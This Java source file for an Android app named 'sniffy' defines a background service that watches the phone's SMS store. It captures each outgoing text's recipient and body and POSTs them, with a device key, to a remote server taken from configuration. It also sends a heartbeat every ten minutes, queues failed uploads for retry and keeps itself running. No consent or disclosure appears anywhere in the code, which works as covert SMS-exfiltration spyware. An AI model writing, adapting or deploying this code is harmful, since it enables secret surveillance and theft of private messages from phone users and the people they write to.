package com.app.sniffy;

import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.Date;
import java.util.LinkedList;
import java.util.Queue;
import java.util.Timer;
import java.util.TimerTask;

import org.apache.http.client.ClientProtocolException;
import org.json.JSONException;
import org.json.JSONObject;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

public class SentBoxService extends Service{

	protected static Queue<JSONObject> sentQueue;
	String key;
	int messageId=0;

	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		outgoingMessage();
		
		SharedPreferences settings = getSharedPreferences(MainActivity.PREFS_NAME, 0);
		key = settings.getString("key", null);

		final JSONObject heartObject = new JSONObject();
		try {
			heartObject.put("key",key);
		} catch (JSONException e) {
			e.printStackTrace();
		}

		Timer timer = new Timer();
		timer.schedule(new TimerTask() {

			@Override
			public void run() {
				try {
					APICall.makePostConnection(new URI(Utils.getConfigProperty(getResources(), "heartbeat")),heartObject);
				} catch (URISyntaxException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (ClientProtocolException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}, 600000, 600000); // ten minutes timer
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// We want this service to continue running until it is explicitly
		// stopped, so return sticky.
		return START_STICKY;
	}

	private void outgoingMessage(){

		ContentResolver contentResolver = getContentResolver();
		contentResolver.registerContentObserver(Uri.parse("content://sms"),true, new SmsObserver(new Handler()));

	}

	private class SmsObserver extends ContentObserver {

		public SmsObserver(Handler handler) {
			super(handler);
		}

		@Override
		public boolean deliverSelfNotifications() {
			return true;
		}

		@Override
		public void onChange(boolean selfChange) {
			super.onChange(selfChange);

			new Thread(new Runnable() {

				@Override
				public void run() {
					Uri uriSMSURI = Uri.parse("content://sms");
					Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, null);
					// this will make it point to the first record, which is the last SMS sent
					cur.moveToNext();
					
					int type = cur.getInt(cur.getColumnIndex("type"));
					int id = cur.getInt(cur.getColumnIndex("_id"));
					if(type == 6){
						//Processing the outgoing message
						if(id > messageId){
							messageId = id;	
							String content = cur.getString(cur.getColumnIndex("body"));
							String msg_to = cur.getString(cur.getColumnIndex("address"));

							JSONObject messageJson = new JSONObject();
							try {
								messageJson.put("key", key);
								messageJson.put("remoteNumber", msg_to);
								messageJson.put("phoneTime", (new Date().getTime()));
								messageJson.put("textMessage", content);
								messageJson.put("outgoing", true);
							} catch (JSONException e1) {
								e1.printStackTrace();
							}
							Log.d("sent message", messageJson.toString());

							try {
								APICall.makePostConnection(new URI(Utils.getConfigProperty(getResources(), "sendIncoming")),messageJson);
							} catch (ClientProtocolException e) {
								Log.d("sent box service ClientProtocolException", e.toString());
							} catch (IOException e) {
								Log.d("sent box service IOException", e.toString());
								if(sentQueue == null)
									sentQueue = new LinkedList<JSONObject>();

								sentQueue.offer(messageJson);
							} catch (URISyntaxException e) {
								e.printStackTrace();
							}
						}
					}
					cur.close();
				}
			}).start();


		}
	}

	protected class sendOutgoing extends AsyncTask<URI, Void, String> {

		JSONObject message;

		public sendOutgoing(JSONObject message){
			this.message = message;
		}

		@Override
		protected String doInBackground(URI... url) {
			int count = url.length;
			String result = "";
			for (int i = 0; i < count; i++) {
				try {
					Log.d("sent message", message.toString());
					result = APICall.makePostConnection(url[i],message);
				} catch (ClientProtocolException e) {
					Log.d("sent box service ClientProtocolException", e.toString());
				} catch (IOException e) {
					Log.d("sent box service IOException", e.toString());
					if(sentQueue == null)
						sentQueue = new LinkedList<JSONObject>();

					sentQueue.offer(message);
				}
			}
			return result;
		}

		@Override
		protected void onPostExecute(String result) {

		}
	}

}
